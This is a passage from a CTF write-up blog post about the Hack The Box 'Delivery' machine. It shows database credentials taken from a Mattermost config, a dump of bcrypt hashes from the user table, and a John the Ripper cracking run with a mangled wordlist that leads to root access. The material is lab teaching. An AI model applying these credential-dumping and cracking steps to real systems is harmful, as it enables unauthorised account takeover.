</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-json data-lang=json><span class=line><span class=cl>    <span class=s2>&#34;SqlSettings&#34;</span><span class=err>:</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>        <span class=nt>&#34;DriverName&#34;</span><span class=p>:</span> <span class=s2>&#34;mysql&#34;</span><span class=p>,</span>
</span></span><span class=line><span class=cl>        <span class=nt>&#34;DataSource&#34;</span><span class=p>:</span> <span class=s2>&#34;mmuser:Crack_The_MM_Admin_PW@tcp(127.0.0.1:3306)/mattermost?charset=utf8mb4,utf8\u0026readTimeout=30s\u0026writeTimeout=30s&#34;</span><span class=p>,</span>
</span></span><span class=line><span class=cl>        <span class=nt>&#34;DataSourceReplicas&#34;</span><span class=p>:</span> <span class=p>[],</span>
</span></span><span class=line><span class=cl>        <span class=nt>&#34;DataSourceSearchReplicas&#34;</span><span class=p>:</span> <span class=p>[],</span>
</span></span><span class=line><span class=cl>        <span class=nt>&#34;MaxIdleConns&#34;</span><span class=p>:</span> <span class=mi>20</span><span class=p>,</span>
</span></span><span class=line><span class=cl>        <span class=nt>&#34;ConnMaxLifetimeMilliseconds&#34;</span><span class=p>:</span> <span class=mi>3600000</span><span class=p>,</span>
</span></span><span class=line><span class=cl>        <span class=nt>&#34;MaxOpenConns&#34;</span><span class=p>:</span> <span class=mi>300</span><span class=p>,</span>
</span></span><span class=line><span class=cl>        <span class=nt>&#34;Trace&#34;</span><span class=p>:</span> <span class=kc>false</span><span class=p>,</span>
</span></span><span class=line><span class=cl>        <span class=nt>&#34;AtRestEncryptKey&#34;</span><span class=p>:</span> <span class=s2>&#34;n5uax3d4f919obtsp1pw1k5xetq1enez&#34;</span><span class=p>,</span>
</span></span><span class=line><span class=cl>        <span class=nt>&#34;QueryTimeout&#34;</span><span class=p>:</span> <span class=mi>30</span><span class=p>,</span>
</span></span><span class=line><span class=cl>        <span class=nt>&#34;DisableDatabaseSearch&#34;</span><span class=p>:</span> <span class=kc>false</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span>
</span></span></code></pre></td></tr></table></div></div><p>It seems we have the creds of the DB in <code>DataSource</code>.</p><p>So we can connect to it and do the same as in our history:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span><span class=lnt>21
</span><span class=lnt>22
</span><span class=lnt>23
</span><span class=lnt>24
</span><span class=lnt>25
</span><span class=lnt>26
</span><span class=lnt>27
</span><span class=lnt>28
</span><span class=lnt>29
</span><span class=lnt>30
</span><span class=lnt>31
</span><span class=lnt>32
</span><span class=lnt>33
</span><span class=lnt>34
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-gdscript3 data-lang=gdscript3><span class=line><span class=cl><span class=n>maildeliverer</span><span class=err>@</span><span class=n>Delivery</span><span class=p>:</span><span class=o>~$</span> <span class=n>mysql</span> <span class=o>-</span><span class=n>u</span> <span class=n>mmuser</span> <span class=o>-</span><span class=n>p</span>
</span></span><span class=line><span class=cl><span class=n>Enter</span> <span class=n>password</span><span class=p>:</span>
</span></span><span class=line><span class=cl><span class=n>Welcome</span> <span class=n>to</span> <span class=n>the</span> <span class=n>MariaDB</span> <span class=n>monitor</span><span class=o>.</span>  <span class=n>Commands</span> <span class=n>end</span> <span class=n>with</span> <span class=p>;</span> <span class=ow>or</span> \<span class=n>g</span><span class=o>.</span>
</span></span><span class=line><span class=cl><span class=n>Your</span> <span class=n>MariaDB</span> <span class=n>connection</span> <span class=n>id</span> <span class=n>is</span> <span class=mi>488</span>
</span></span><span class=line><span class=cl><span class=n>Server</span> <span class=n>version</span><span class=p>:</span> <span class=mf>10.3</span><span class=o>.</span><span class=mi>27</span><span class=o>-</span><span class=n>MariaDB</span><span class=o>-</span><span class=mi>0</span><span class=o>+</span><span class=n>deb10u1</span> <span class=n>Debian</span> <span class=mi>10</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>Copyright</span> <span class=p>(</span><span class=n>c</span><span class=p>)</span> <span class=mi>2000</span><span class=p>,</span> <span class=mi>2018</span><span class=p>,</span> <span class=n>Oracle</span><span class=p>,</span> <span class=n>MariaDB</span> <span class=n>Corporation</span> <span class=n>Ab</span> <span class=ow>and</span> <span class=n>others</span><span class=o>.</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>Type</span> <span class=s1>&#39;help;&#39;</span> <span class=ow>or</span> <span class=s1>&#39;\h&#39;</span> <span class=k>for</span> <span class=n>help</span><span class=o>.</span> <span class=n>Type</span> <span class=s1>&#39;\c&#39;</span> <span class=n>to</span> <span class=n>clear</span> <span class=n>the</span> <span class=n>current</span> <span class=n>input</span> <span class=n>statement</span><span class=o>.</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>MariaDB</span> <span class=p>[(</span><span class=n>none</span><span class=p>)]</span><span class=o>&gt;</span> <span class=n>use</span> <span class=n>mattermost</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=n>Reading</span> <span class=n>table</span> <span class=n>information</span> <span class=k>for</span> <span class=n>completion</span> <span class=n>of</span> <span class=n>table</span> <span class=ow>and</span> <span class=n>column</span> <span class=n>names</span>
</span></span><span class=line><span class=cl><span class=n>You</span> <span class=n>can</span> <span class=n>turn</span> <span class=n>off</span> <span class=n>this</span> <span class=n>feature</span> <span class=n>to</span> <span class=n>get</span> <span class=n>a</span> <span class=n>quicker</span> <span class=n>startup</span> <span class=n>with</span> <span class=o>-</span><span class=n>A</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>Database</span> <span class=n>changed</span>
</span></span><span class=line><span class=cl><span class=n>MariaDB</span> <span class=p>[</span><span class=n>mattermost</span><span class=p>]</span><span class=o>&gt;</span> <span class=n>select</span> <span class=n>Username</span><span class=p>,</span> <span class=n>Password</span> <span class=n>from</span> <span class=n>Users</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=o>+----------------------------------+--------------------------------------------------------------+</span>
</span></span><span class=line><span class=cl><span class=o>|</span> <span class=n>Username</span>                         <span class=o>|</span> <span class=n>Password</span>                                                     <span class=o>|</span>
</span></span><span class=line><span class=cl><span class=o>+----------------------------------+--------------------------------------------------------------+</span>
</span></span><span class=line><span class=cl><span class=o>|</span> <span class=n>duomox</span>                           <span class=o>|</span> <span class=o>$</span><span class=mi>2</span><span class=n>a</span><span class=o>$</span><span class=mi>10</span><span class=o>$</span><span class=n>ehf6UdxrQX4MHIfe8ohIhe4k</span><span class=o>.</span><span class=n>IvQ89gvpg4UVjYrkonki9Vy3j9Qq</span> <span class=o>|</span>
</span></span><span class=line><span class=cl><span class=o>|</span> <span class=n>surveybot</span>                        <span class=o>|</span>                                                              <span class=o>|</span>
</span></span><span class=line><span class=cl><span class=o>|</span> <span class=n>c3ecacacc7b94f909d04dbfd308a9b93</span> <span class=o>|</span> <span class=o>$</span><span class=mi>2</span><span class=n>a</span><span class=o>$</span><span class=mi>10</span><span class=o>$</span><span class=n>u5815SIBe2Fq1FZlv9S8I</span><span class=o>.</span><span class=n>VjU3zeSPBrIEg9wvpiLaS7ImuiItEiK</span> <span class=o>|</span>
</span></span><span class=line><span class=cl><span class=o>|</span> <span class=mi>5</span><span class=n>b785171bfb34762a933e127630c4860</span> <span class=o>|</span> <span class=o>$</span><span class=mi>2</span><span class=n>a</span><span class=o>$</span><span class=mi>10</span><span class=o>$</span><span class=mi>3</span><span class=n>m0quqyvCE8Z</span><span class=o>/</span><span class=n>R1gFcCOWO6tEj6FtqtBn8fRAXQXmaKmg</span><span class=o>.</span><span class=n>HDGpS</span><span class=o>/</span><span class=n>G</span> <span class=o>|</span>
</span></span><span class=line><span class=cl><span class=o>|</span> <span class=n>moi</span>                              <span class=o>|</span> <span class=o>$</span><span class=mi>2</span><span class=n>a</span><span class=o>$</span><span class=mi>10</span><span class=o>$</span><span class=mi>1</span><span class=n>huj5gajGm0lofKJDwx5iOVwlxXlyts1LFfpM6YcGMiaAK7KE1Ee2</span> <span class=o>|</span>
</span></span><span class=line><span class=cl><span class=o>|</span> <span class=n>one</span>                              <span class=o>|</span> <span class=o>$</span><span class=mi>2</span><span class=n>a</span><span class=o>$</span><span class=mi>10</span><span class=o>$</span><span class=mi>5</span><span class=n>b5xCPsSvpVQ7Ed</span><span class=o>.</span><span class=n>LA</span><span class=o>/</span><span class=n>UnOcv7ag4FHJ1ZWV4j</span><span class=o>/</span><span class=n>VEBb9y4XBBy3ywW</span> <span class=o>|</span>
</span></span><span class=line><span class=cl><span class=o>|</span> <span class=n>user1234</span>                         <span class=o>|</span> <span class=o>$</span><span class=mi>2</span><span class=n>a</span><span class=o>$</span><span class=mi>10</span><span class=o>$</span><span class=n>LcxQKEkWX82gx8cIHT46tOklDQVYh</span><span class=o>.</span><span class=n>BVIfeFGH3gMMkxvyarjysqe</span> <span class=o>|</span>
</span></span><span class=line><span class=cl><span class=o>|</span> <span class=n>root</span>                             <span class=o>|</span> <span class=o>$</span><span class=mi>2</span><span class=n>a</span><span class=o>$</span><span class=mi>10</span><span class=o>$</span><span class=n>VM6EeymRxJ29r8Wjkr8Dtev0O</span><span class=o>.</span><span class=mi>1</span><span class=n>STWb4</span><span class=o>.</span><span class=mi>4</span><span class=n>ScG</span><span class=o>.</span><span class=n>anuu7v0EFJwgjjO</span> <span class=o>|</span>
</span></span><span class=line><span class=cl><span class=o>|</span> <span class=n>ff0a21fc6fc2488195e16ea854c963ee</span> <span class=o>|</span> <span class=o>$</span><span class=mi>2</span><span class=n>a</span><span class=o>$</span><span class=mi>10</span><span class=o>$</span><span class=n>RnJsISTLc9W3iUcUggl1KOG9vqADED24CQcQ8zvUm1Ir9pxS</span><span class=o>.</span><span class=n>Pduq</span> <span class=o>|</span>
</span></span><span class=line><span class=cl><span class=o>|</span> <span class=n>channelexport</span>                    <span class=o>|</span>                                                              <span class=o>|</span>
</span></span><span class=line><span class=cl><span class=o>|</span> <span class=n>lopes</span>                            <span class=o>|</span> <span class=o>$</span><span class=mi>2</span><span class=n>a</span><span class=o>$</span><span class=mi>10</span><span class=o>$</span><span class=n>x1IJFMel6US3MUP</span><span class=o>.</span><span class=n>CdLm</span><span class=o>.</span><span class=n>eC0WAt3jx8xDt</span><span class=o>/</span><span class=mi>4</span><span class=n>Mwr475H3zD3WnkwSy</span> <span class=o>|</span>
</span></span><span class=line><span class=cl><span class=o>|</span> <span class=mi>9</span><span class=n>ecfb4be145d47fda0724f697f35ffaf</span> <span class=o>|</span> <span class=o>$</span><span class=mi>2</span><span class=n>a</span><span class=o>$</span><span class=mi>10</span><span class=o>$</span><span class=n>s</span><span class=o>.</span><span class=n>cLPSjAVgawGOJwB7vrqenPg2lrDtOECRtjwWahOzHfq1CoFyFqm</span> <span class=o>|</span>
</span></span><span class=line><span class=cl><span class=o>|</span> <span class=n>one1</span>                             <span class=o>|</span> <span class=o>$</span><span class=mi>2</span><span class=n>a</span><span class=o>$</span><span class=mi>10</span><span class=o>$</span><span class=n>p</span><span class=o>/</span><span class=mf>0e8</span><span class=n>pFihTZBHZmPb1mv6O553J5</span><span class=o>/</span><span class=n>oWythXgXYO4Zg1aDe2ZDjyCTq</span> <span class=o>|</span>
</span></span><span class=line><span class=cl><span class=o>+----------------------------------+--------------------------------------------------------------+</span>
</span></span><span class=line><span class=cl><span class=mi>13</span> <span class=n>rows</span> <span class=ow>in</span> <span class=n>set</span> <span class=p>(</span><span class=mf>0.000</span> <span class=n>sec</span><span class=p>)</span>
</span></span></code></pre></td></tr></table></div></div><p>Let&rsquo;s try to crack the root account. The hint told us not to try rockyou but to
use some mangling rules on the word <code>PleaseSubscribe!</code>.</p><p>With the tool mentalist I created a mangling rule for JtR:</p><p><code>root.mentalist</code></p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-json data-lang=json><span class=line><span class=cl><span class=p>{</span><span class=nt>&#34;nodes&#34;</span><span class=p>:</span> <span class=p>[{</span><span class=nt>&#34;attributes&#34;</span><span class=p>:</span> <span class=p>[{</span><span class=nt>&#34;class_name&#34;</span><span class=p>:</span> <span class=s2>&#34;StringListAttr&#34;</span><span class=p>,</span> <span class=nt>&#34;kwargs&#34;</span><span class=p>:</span> <span class=p>{</span><span class=nt>&#34;strings&#34;</span><span class=p>:</span> <span class=p>[</span><span class=s2>&#34;PleaseSubscribe!&#34;</span><span class=p>],</span> <span class=nt>&#34;label&#34;</span><span class=p>:</span> <span class=s2>&#34;String: &#39;PleaseSubscribe!&#39;&#34;</span><span class=p>}}],</span> <span class=nt>&#34;type_&#34;</span><span class=p>:</span> <span class=s2>&#34;base&#34;</span><span class=p>},</span> <span class=p>{</span><span class=nt>&#34;attributes&#34;</span><span class=p>:</span> <span class=p>[{</span><span class=nt>&#34;class_name&#34;</span><span class=p>:</span> <span class=s2>&#34;RangeAttr&#34;</span><span class=p>,</span> <span class=nt>&#34;kwargs&#34;</span><span class=p>:</span> <span class=p>{</span><span class=nt>&#34;start&#34;</span><span class=p>:</span> <span class=mi>0</span><span class=p>,</span> <span class=nt>&#34;end&#34;</span><span class=p>:</span> <span class=mi>101</span><span class=p>,</span> <span class=nt>&#34;zfill&#34;</span><span class=p>:</span> <span class=mi>0</span><span class=p>,</span> <span class=nt>&#34;label&#34;</span><span class=p>:</span> <span class=s2>&#34;Numbers: Small 0-100&#34;</span><span class=p>}}],</span> <span class=nt>&#34;type_&#34;</span><span class=p>:</span> <span class=s2>&#34;Append&#34;</span><span class=p>}],</span> <span class=nt>&#34;version&#34;</span><span class=p>:</span> <span class=s2>&#34;1.0&#34;</span><span class=p>}</span>
</span></span></code></pre></td></tr></table></div></div><p>I took the string in input and appended a short list of numbers and then exported
the full wordlist: root.txt.</p><p>Then we can crack it with JtR:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span><span class=lnt>5
</span><span class=lnt>6
</span><span class=lnt>7
</span><span class=lnt>8
</span><span class=lnt>9
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-gdscript3 data-lang=gdscript3><span class=line><span class=cl><span class=o>$</span> <span class=n>john</span> <span class=o>--</span><span class=n>format</span><span class=o>=</span><span class=n>bcrypt</span> <span class=nb>hash</span><span class=o>.</span><span class=n>txt</span> <span class=o>--</span><span class=n>wordlist</span><span class=o>=</span><span class=n>root</span><span class=o>.</span><span class=n>txt</span>
</span></span><span class=line><span class=cl><span class=n>Using</span> <span class=n>default</span> <span class=n>input</span> <span class=n>encoding</span><span class=p>:</span> <span class=n>UTF</span><span class=o>-</span><span class=mi>8</span>
</span></span><span class=line><span class=cl><span class=n>Loaded</span> <span class=mi>1</span> <span class=n>password</span> <span class=nb>hash</span> <span class=p>(</span><span class=n>bcrypt</span> <span class=p>[</span><span class=n>Blowfish</span> <span class=mi>32</span><span class=o>/</span><span class=mi>64</span> <span class=n>X3</span><span class=p>])</span>
</span></span><span class=line><span class=cl><span class=n>Cost</span> <span class=mi>1</span> <span class=p>(</span><span class=n>iteration</span> <span class=n>count</span><span class=p>)</span> <span class=n>is</span> <span class=mi>1024</span> <span class=k>for</span> <span class=n>all</span> <span class=n>loaded</span> <span class=n>hashes</span>
</span></span><span class=line><span class=cl><span class=n>Will</span> <span class=n>run</span> <span class=mi>4</span> <span class=n>OpenMP</span> <span class=n>threads</span>
</span></span><span class=line><span class=cl><span class=n>Press</span> <span class=s1>&#39;q&#39;</span> <span class=ow>or</span> <span class=n>Ctrl</span><span class=o>-</span><span class=n>C</span> <span class=n>to</span> <span class=n>abort</span><span class=p>,</span> <span class=n>almost</span> <span class=n>any</span> <span class=n>other</span> <span class=n>key</span> <span class=k>for</span> <span class=n>status</span>
</span></span><span class=line><span class=cl><span class=n>PleaseSubscribe</span><span class=o>!</span><span class=mi>21</span> <span class=p>(</span><span class=n>root</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=mi>1</span><span class=n>g</span> <span class=mi>0</span><span class=p>:</span><span class=mi>00</span><span class=p>:</span><span class=mi>00</span><span class=p>:</span><span class=mi>01</span> <span class=n>DONE</span> <span class=p>(</span><span class=mi>2021</span><span class=o>-</span><span class=mi>01</span><span class=o>-</span><span class=mi>30</span> <span class=mi>19</span><span class=p>:</span><span class=mi>22</span><span class=p>)</span> <span class=mf>0.7751</span><span class=n>g</span><span class=o>/</span><span class=n>s</span> <span class=mf>27.90</span><span class=n>p</span><span class=o>/</span><span class=n>s</span> <span class=mf>27.90</span><span class=n>c</span><span class=o>/</span><span class=n>s</span> <span class=mf>27.90</span><span class=n>C</span><span class=o>/</span><span class=n>s</span> <span class=n>PleaseSubscribe</span><span class=o>!</span><span class=mf>0.</span><span class=o>.</span><span class=n>PleaseSubscribe</span><span class=o>!</span><span class=mi>35</span>
</span></span><span class=line><span class=cl><span class=n>Use</span> <span class=n>the</span> <span class=s2>&#34;--show&#34;</span> <span class=n>option</span> <span class=n>to</span> <span class=n>display</span> <span class=n>all</span> <span class=n>of</span> <span class=n>the</span> <span class=n>cracked</span> <span class=n>passwords</span> <span class=n>reliably</span>
</span></span></code></pre></td></tr></table></div></div><p>So we got the root password and can connect with <code>su</code>.</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span><span class=lnt>5
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>maildeliverer@Delivery:~$ su root
</span></span><span class=line><span class=cl>Password:
</span></span><span class=line><span class=cl>root@Delivery:/home/maildeliverer# cd
</span></span><span class=line><span class=cl>root@Delivery:~# cat root.txt
</span></span><span class=line><span class=cl>2d7cd15d8e1a89279b08dc5948dab25d
</span></span></code></pre></td></tr></table></div></div><h2 id=bonus>Bonus<a hidden class=anchor aria-hidden=true href=#bonus>#</a></h2><p>ippsec contacted me to mention the presence of <code>/root/note.txt</code> which explains
why he created the box:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span><span class=lnt>5
</span><span class=lnt>6
</span><span class=lnt>7
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>I hope you enjoyed this box, the attack may seem silly but it demonstrates a pretty high risk vulnerability I&#39;ve seen several times. The inspiration for the box is here:
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>- https://medium.com/intigriti/how-i-hacked-hundreds-of-companies-through-their-helpdesk-b7680ddc2d4c
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>Keep on hacking! And please don&#39;t forget to subscribe to all the security streamers out there.
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>- ippsec
</span></span></code></pre></td></tr></table></div></div></div><footer class=post-footer><ul class=post-tags><li><a href=https://s4ch.github.io/tags/ctf/>Ctf</a></li><li><a href=https://s4ch.github.io/tags/hackthebox/>Hackthebox</a></li><li><a href=https://s4ch.github.io/tags/penetration-testing/>Penetration-Testing</a></li><li><a href=https://s4ch.github.io/tags/writeup/>Writeup</a></li><li><a href=https://s4ch.github.io/tags/linux/>Linux</a></li><li><a href=https://s4ch.github.io/tags/easy/>Easy</a></li></ul></footer></article></main><footer class=footer><span>&copy; 2025 <a href=https://s4ch.github.io/>CyFun</a></span>
<span>Powered by
<a href=https://gohugo.io/ rel="noopener noreferrer" target=_blank>Hugo</a> &
<a href=https://github.com/adityatelange/hugo-PaperMod/ rel=noopener target=_blank>PaperMod</a></span></footer><a href=#top aria-label="go to top" title="Go to Top (Alt + G)" class=top-link id=top-link accesskey=g><svg viewBox="0 0 12 6" fill="currentColor"><path d="M12 6H0l6-6z"/></svg>
</a><script>let menu=document.getElementById("menu");menu&&(menu.scrollLeft=localStorage.getItem("menu-scroll-position"),menu.onscroll=function(){localStorage.setItem("menu-scroll-position",menu.scrollLeft)}),document.querySelectorAll('a[href^="#"]').forEach(e=>{e.addEventListener("click",function(e){e.preventDefault();var t=this.getAttribute("href").substr(1);window.matchMedia("(prefers-reduced-motion: reduce)").matches?document.querySelector(`[id='${decodeURIComponent(t)}']`).scrollIntoView():document.querySelector(`[id='${decodeURIComponent(t)}']`).scrollIntoView({behavior:"smooth"}),t==="top"?history.replaceState(null,null," "):history.pushState(null,null,`#${t}`)})})</script><script>var mybutton=document.getElementById("top-link");window.onscroll=function(){document.body.scrollTop>800||document.documentElement.scrollTop>800?(mybutton.style.visibility="visible",mybutton.style.opacity="1"):(mybutton.style.visibility="hidden",mybutton.style.opacity="0")}</script><script>document.getElementById("theme-toggle").addEventListener("click",()=>{document.body.className.includes("dark")?(document.body.classList.remove("dark"),localStorage.setItem("pref-theme","light")):(document.body.classList.add("dark"),localStorage.setItem("pref-theme","dark"))})</script><script>document.querySelectorAll("pre > code").forEach(e=>{const n=e.parentNode.parentNode,t=document.createElement("button");t.classList.add("copy-code"),t.innerHTML="copy";function s(){t.innerHTML="copied!",setTimeout(()=>{t.innerHTML="copy"},2e3)}t.addEventListener("click",t=>{if("clipboard"in navigator){navigator.clipboard.writeText(e.textContent),s();return}const n=document.createRange();n.selectNodeContents(e);const o=window.getSelection();o.removeAllRanges(),o.addRange(n);try{document.execCommand("copy"),s()}catch{}o.removeRange(n)}),n.classList.contains("highlight")?n.appendChild(t):n.parentNode.firstChild==n||(e.parentNode.parentNode.parentNode.parentNode.parentNode.nodeName=="TABLE"?e.parentNode.parentNode.parentNode.parentNode.parentNode.appendChild(t):e.parentNode.appendChild(t))})</script></body></html>